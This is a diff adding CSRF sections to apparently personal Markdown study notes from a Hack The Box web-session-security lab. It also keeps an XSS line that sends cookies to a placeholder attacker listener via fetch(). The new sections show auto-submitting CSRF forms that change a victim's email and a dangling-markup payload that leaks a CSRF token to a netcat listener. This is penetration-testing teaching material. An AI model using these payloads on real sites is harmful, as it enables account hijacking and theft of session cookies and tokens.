@@ -21,6 +21,12 @@
       - [Example](#example-2)
         - [Obtaining session cookie through XSS](#obtaining-session-cookie-through-xss)
         - [Obtaining session cookies through XSS (Netcat edition)](#obtaining-session-cookies-through-xss-netcat-edition)
+    - [CSRF](#csrf)
+      - [Example](#example-3)
+    - [CSRF - GET-based](#csrf---get-based)
+      - [Example](#example-4)
+    - [CSRF - POST-based](#csrf---post-based)
+      - [Example](#example-5)
 
 ---
 
@@ -378,4 +384,144 @@ You can no hijack the victim's session.
 > You don't necessarily have to use the ```window.location()``` object that causes the victim to get redirected. You can use ```fetch()```, which can fetch data and send it to your server without any redirects. This is a stealthier way.<br>
 > Example:<br>
 > ```<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>```
+
+### CSRF
+
+... is an attack that forces an end-user to execute inadvertent actions on a web application in which they are currently authenticated. This attack is usually mounted with the help of attacker-crafted web pages that the victim must visit or interact with. These web pages contain malicious requests that essentially inherit the identity and privileges of the victim to perform an undesired function on the victim's behalf.
+
+A web app is vulnerable to CSRF when:
+
+- all the parameters required for the targeted request can be determined or guessed by the attacker
+- the application's session management is solely based on HTTP cookies, which are automatically included in browser request
+
+To successfully exploit CSRF, you need:
+
+- to craft a malicious web page that will issue a valid (_cross-site_) request impersonating the victim
+- the victim to be logged into the application at the time when the malicious cross-site request is issued
+
+#### Example
+
+Log in with given credentials, activate Burpsuite and change the contact info.
+
+Interception with Burp:
+
+![csrf 1](../../../images/session_security_csrf1.png)
+
+You notice no anti-CSRF token in the update-profile request. Now try executing a CSRF attack that will change her profile details by simply visiting another website.
+
+Create and serve the below HTML:
+
+```html
+<html>
+  <body>
+    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
+      <input type="hidden" name="email" value="attacker@htb.net" />
+      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
+      <input type="hidden" name="country" value="CSRF_POC" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.getElementById("submitMe").submit()
+    </script>
+  </body>
+</html>
+```
+
+... and:
+
+```bash
+d41y@htb[/htb]$ python -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+```
+
+Open a new tab and visit the page you are serving from your attacking machine:
+
+![csrf 2](../../../images/session_security_csrf2.png)
+
+### CSRF - GET-based
+
+Similar to how you can extract session cookies from applications that do not utilize SSL encryption, you can do the same regarding CSRF tokens included in unencrypted requests.
+
+#### Example
+
+Log on with given credentials. Browse to the profile and click "Save".
+
+![csrf 3](../../../images/session_security_csrf3.png)
+
+Activate Burp and click "Save" again.
+
+![csrf 4](../../../images/session_security_csrf4.png)
+
+The CSRF token is included in the GET request.
+
+Now simulate an attacker on the local network that sniffed the abovementioned request and wants to deface Julie Rogers' profile through a CSRF attack.
+
+First, create and serve the below HTML:
+
+```html
+<html>
+  <body>
+    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
+      <input type="hidden" name="email" value="attacker@htb.net" />
+      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
+      <input type="hidden" name="country" value="CSRF_POC" />
+      <input type="hidden" name="action" value="save" />
+      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.getElementById("submitMe").submit()
+    </script>
+  </body>
+</html>
+```
+
+... and:
+
+```bash
+d41y@htb[/htb]$ python -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+```
+
+Open a new tab and visit the page you are serving from your attacking machine.
+
+![csrf 5](../../../images/session_security_csrf5.png)
+
+### CSRF - POST-based
+
+#### Example
+
+Log in with the given credentials and click on "Delete". You will get redirected to ```/app/delete/<your-email>```.
+
+![csrf 6](../../../images/session_security_csrf6.png)
+
+
+Notice that the email is reflected on the page. Try inputting some HTML into the email value, such as:
+
+```html
+<h1>h1<u>underline<%2fu><%2fh1>
+```
+
+![csrf 7](../../../images/session_security_csrf7.png)
+
+If you inspect the source, you will notice that your injection happens before a ```'```. You can abuse this to leak the CSRF token.
+
+![csrf 8](../../../images/session_security_csrf8.png)
+
+First, instruct Netcat to listen on port 8000:
+
+```bash
+d41y@htb[/htb]$ nc -nlvp 8000
+listening on [any] 8000 ...
+```
+
+Now you can get the CSRF token via sending the below payload:
+
+```html
+<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f
+```
+
+While still loggen in as Julie Rogers, open a new tab and visit the ```http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f```. You will notice a connection being made that leaks the CSRF token.
+
+![csrf 9](../../../images/session_security_csrf9.png)
 
